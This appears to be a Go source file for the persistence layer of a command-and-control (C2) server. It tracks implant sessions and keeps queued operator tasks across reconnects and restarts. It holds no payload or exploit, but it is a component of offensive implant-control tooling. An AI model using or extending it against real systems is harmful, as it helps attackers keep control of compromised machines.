package c2

import (
	"context"
	"log"
	"time"
)

// Persistence is the durable side of the C2 engine. Implementations must be
// safe for concurrent use. Queueing is fail-closed: if TaskQueued returns an
// error, the task is not accepted into the in-memory queue.
type Persistence interface {
	SessionRegistered(ctx context.Context, session *ImplantSession) error
	SessionCheckin(ctx context.Context, sessionID string, at time.Time) error
	SessionDisconnected(ctx context.Context, sessionID string, at time.Time) error
	PendingTasks(ctx context.Context, implantID string) ([]*Task, error)
	TaskQueued(ctx context.Context, task *Task) error
	TaskDispatched(ctx context.Context, taskIDs []string, at time.Time) error
	TaskCompleted(ctx context.Context, result *TaskResult) error
	MarkLiveSessionsDisconnected(ctx context.Context) error
}

// SetPersistence installs the durable store used by the live handler. It must
// be called before the server accepts connections.
func (s *ImplantServer) SetPersistence(p Persistence) {
	s.mu.Lock()
	s.persist = p
	s.mu.Unlock()
}

func (s *ImplantServer) persistence() Persistence {
	s.mu.RLock()
	p := s.persist
	s.mu.RUnlock()
	return p
}

func (s *ImplantServer) persistSessionRegistered(session *ImplantSession) {
	p := s.persistence()
	if p == nil {
		return
	}
	if err := p.SessionRegistered(context.Background(), session); err != nil {
		log.Printf("[c2] persist session %s: %v", session.ID, err)
	}
}

func (s *ImplantServer) persistSessionCheckin(sessionID string, at time.Time) {
	p := s.persistence()
	if p == nil {
		return
	}
	if err := p.SessionCheckin(context.Background(), sessionID, at); err != nil {
		log.Printf("[c2] persist checkin %s: %v", sessionID, err)
	}
}

func (s *ImplantServer) persistSessionDisconnected(sessionID string) {
	p := s.persistence()
	if p == nil {
		return
	}
	if err := p.SessionDisconnected(context.Background(), sessionID, time.Now()); err != nil {
		log.Printf("[c2] persist disconnect %s: %v", sessionID, err)
	}
}

// loadPersistedTasks rebinds queued tasks for an implant to its new session.
// This is what lets operator intent survive a reconnect or server restart.
func (s *ImplantServer) loadPersistedTasks(sessionID, implantID string) {
	p := s.persistence()
	if p == nil || implantID == "" {
		return
	}
	tasks, err := p.PendingTasks(context.Background(), implantID)
	if err != nil {
		log.Printf("[c2] load pending tasks for implant %s: %v", implantID, err)
		return
	}
	if len(tasks) == 0 {
		return
	}

	s.mu.Lock()
	defer s.mu.Unlock()
	existing := make(map[string]struct{}, len(s.taskQueues[sessionID]))
	for _, t := range s.taskQueues[sessionID] {
		existing[t.ID] = struct{}{}
	}
	merged := make([]*Task, 0, len(tasks)+len(s.taskQueues[sessionID]))
	for _, t := range tasks {
		if _, ok := existing[t.ID]; ok {
			continue
		}
		t.SessionID = sessionID
		merged = append(merged, t)
	}
	s.taskQueues[sessionID] = append(merged, s.taskQueues[sessionID]...)
	if len(merged) > 0 {
		log.Printf("[c2] rebound %d persisted task(s) to session %s", len(merged), sessionID)
	}
}

func (s *ImplantServer) persistTaskQueued(task *Task) error {
	p := s.persistence()
	if p == nil {
		return nil
	}
	return p.TaskQueued(context.Background(), task)
}

func (s *ImplantServer) persistTaskDispatched(taskIDs []string, at time.Time) {
	if len(taskIDs) == 0 {
		return
	}
	p := s.persistence()
	if p == nil {
		return
	}
	if err := p.TaskDispatched(context.Background(), taskIDs, at); err != nil {
		log.Printf("[c2] persist dispatch of %d task(s): %v", len(taskIDs), err)
	}
}

func (s *ImplantServer) persistTaskCompleted(result *TaskResult) {
	p := s.persistence()
	if p == nil {
		return
	}
	if err := p.TaskCompleted(context.Background(), result); err != nil {
		log.Printf("[c2] persist result for task %s: %v", result.TaskID, err)
	}
}
